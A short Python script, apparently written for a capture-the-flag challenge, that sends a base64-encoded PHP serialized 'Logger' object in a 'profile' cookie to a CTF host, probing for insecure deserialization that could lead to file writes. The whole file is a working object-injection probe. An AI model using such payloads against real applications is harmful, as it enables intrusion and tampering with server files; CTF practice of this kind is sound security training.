import requests
import base64

url = "http://ctfinf.ru:10036/"

# Тестовый payload для проверки записи
payload = 'O:6:"Logger":2:{s:14:"\x00Logger\x00log_file";s:15:"/var/log/app.log";s:1:"x";s:7:"saveLog";}'

cookies = {
    'profile': base64.b64encode(payload.encode()).decode()
}

response = requests.get(url, cookies=cookies)
print(response.text)